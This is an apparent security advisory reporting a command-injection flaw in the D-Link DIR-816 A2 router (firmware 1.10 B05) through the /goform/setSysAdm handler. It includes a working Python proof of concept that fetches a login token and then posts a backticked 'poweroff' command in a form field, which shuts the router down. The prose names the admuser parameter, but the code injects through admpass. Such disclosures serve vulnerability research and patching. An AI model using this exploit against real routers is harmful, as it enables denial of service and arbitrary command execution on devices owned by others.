# D-Link DIR-816 A2 cmd_injection

**Vender**: D-Link

**Firmware version**: 1.10 B05

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**: http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-816

**Exploit Author**: [SkYe231](mailto:skye231@foxmail.com)

## detail

In the handler of route `/goform/setSysAdm`, the value of parameter `admuser` is used in the construction of command `chpasswd.sh %s %s`, which is later fed to `system`:

![20210310231620](20210310231620.png)

So it could lead to command injection with crafted request.

## POC

> The injection command is `poweroff`. After running POC, the router will **shut down**

```python
# coding=utf-8
import requests
import re

ip = "192.168.0.1"
cmd = "`poweroff`"

print("[+]Get tokenid")

url = "http://{}/dir_login.asp".format(ip)
rsp = requests.get(url)

pattern = re.compile(r'name="tokenid"  value="\d+"')
result = pattern.findall(rsp.text)
tokenid = result[0][23:33]
print("[+]tokenid:{}".format(tokenid))

url = "http://{}/goform/setSysAdm".format(ip)
data = {"admuser": "admin", "admpass": cmd, "tokenid": tokenid}
try:
    requests.post(url, data=data, allow_redirects=False, timeout=1)
except:
    pass
print("[+]DIR816: {}".format(cmd))
```

